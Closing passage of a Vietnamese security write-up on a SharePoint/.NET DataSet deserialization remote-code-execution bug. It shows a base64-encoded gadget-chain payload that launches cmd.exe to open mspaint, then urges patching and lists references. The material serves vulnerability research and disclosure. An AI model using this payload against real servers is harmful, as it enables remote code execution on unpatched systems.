xsi:type="xsd:string">/wEykwcAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC1BTw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+DQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBtc3BhaW50IiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgs=</anyType>
            </MethodParameters>
            <ObjectInstance xsi:type="LosFormatter"></ObjectInstance>
        </ProjectedProperty0>
        </pwn>
      </Exp_x0020_Table>
    </somedataset>
  </diffgr:diffgram>
</DataSet>
```
![](https://srcincite.io/assets/images/sharepoint-and-pwn/rce.png)

## Kết Luận
Microsoft đánh giá lỗi này với xếp hạng chỉ số khả năng khai thác là 1 và chúng tôi đồng ý, có nghĩa là bạn nên vá lỗi này ngay lập tức nếu chưa. Rất vui rằng chuỗi tiện ích này có thể được sử dụng chống lại một số ứng dụng được xây dựng bằng .net, vì vậy ngay cả khi bạn chưa cài đặt SharePoint Server, bạn vẫn bị ảnh hưởng bởi lỗi này.

+ [attacking-net-serialization](https://speakerdeck.com/pwntester/attacking-net-serialization)
+ [docs.microsoft](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/dataset-datatable-dataview/security-guidance)
+ [advisories/ZDI-20-874](https://www.zerodayinitiative.com/advisories/ZDI-20-874/)

## Bài viết khá dài :D 
## Thanks :D













